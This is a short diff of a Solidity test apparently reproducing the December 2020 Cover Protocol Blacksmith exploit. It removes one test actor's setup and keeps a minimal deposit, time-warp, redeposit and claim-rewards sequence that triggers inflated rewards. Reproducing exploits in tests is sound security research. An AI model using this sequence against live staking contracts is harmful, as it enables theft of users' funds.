@@ -56,19 +56,13 @@ contract DhCover20201228Test is DSTest {
     }
 
     function test_exploit() public {
-        Guy ali = new Guy();
         Guy bob = new Guy();
 
         uint256 AMT = 1000 * 10**18;
-        lpToken.mint(address(ali), AMT);
         lpToken.mint(address(bob), AMT);
-
-        ali.approve(lpToken, address(blacksmith));
         bob.approve(lpToken, address(blacksmith));
 
-        ali.deposit(blacksmith, address(lpToken), AMT);
         bob.deposit(blacksmith, address(lpToken), 1);
-        ali.withdraw(blacksmith, address(lpToken), AMT);
         hevm.warp(block.timestamp + 1 days);
         bob.deposit(blacksmith, address(lpToken), AMT - 1);
         bob.claimRewards(blacksmith, address(lpToken));
